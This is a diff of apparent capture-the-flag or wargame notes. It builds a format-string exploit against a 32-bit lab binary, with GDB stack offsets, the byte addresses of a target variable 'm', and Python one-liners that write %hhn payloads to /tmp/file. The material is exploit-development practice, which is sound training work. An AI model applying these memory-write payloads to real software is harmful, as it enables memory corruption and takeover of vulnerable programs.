@@ -10,17 +10,46 @@ info variables
 
 Current level :
 
-m address : 0x08049810 
+m address : 0x08049810
 m address formatted : \x10\x98\x04\x08
+
+address of m 1st byte : 0x08049810
+address of m 2nd byte : 0x08049811
+address of m 3rd byte : 0x08049812
+address of m 4th byte : 0x08049813
+
+address of m 1st byte formatted : \x10\x98\x04\x08
+address of m 2nd byte formatted : \x11\x98\x04\x08
+address of m 3rd byte formatted : \x12\x98\x04\x08
+address of m 4th byte formatted : \x13\x98\x04\x08
 
 x/136xw $esp
 
 esp : 0xbffff500
-start : 0xbffff510
+buffer start : 0xbffff510
 ebp : 0xbffff718
 eip : 0xbffff728
 
-eip - start = 
+x/28xw 0xbffff510
 
-    bytes + 4 bytes eip
-=>  NOP +  byte shellcode + 4 bytes eip
+
+buffer start at $12
+
+BUFFER :
+12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29   30   31   32   33   34   35   36   37   38   39   40
+AAAA BBBB CCCC DDDD EEEE FFFF GGGG HHHH IIII JJJJ KKKK LLLL MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT UU33 3333 3WWW XXXX YYYY ZZZZ ++++ ---- ....
+
+12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29   30   31   32   33   34   35   36   37   38   39   40
+A%99 $hhn C%99 $hhn EEEE FFFF GGGG HHHH IIII JJJJ KKKK LLLL MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT UU%9 9$hh nWWW XXXX YYYY ZZZZ ++%9 9$hh n...
+
+COPY PASTABLE :
+A%99$hhnC%99$hhnEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUU%99$hhnWWWXXXXYYYYZZZZ++%99$hhn---....
+
+PYTHON :
+python -c 'print("A%99$hhnC%99$hhnEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUU%99$hhnWWWXXXXYYYYZZZZ++%99$hhn---....")' > /tmp/file
+
+ADD ADDRESSES :
+python -c 'print("A%99$hhnC%99$hhnEEEEFFFFGGGGHHHH" + "\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08" + "MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUU%99$hhnWWWXXXXYYYYZZZZ++%99$hhn---....")' > /tmp/file
+
+REPLACE INDEXES
+python -c 'print("A%23$hhnC%22$hhnEEEEFFFFGGGGHHHH" + "\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08" + "MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUU%20$hhnWWWXXXXYYYYZZZZ++%21$hhn---....")' > /tmp/file
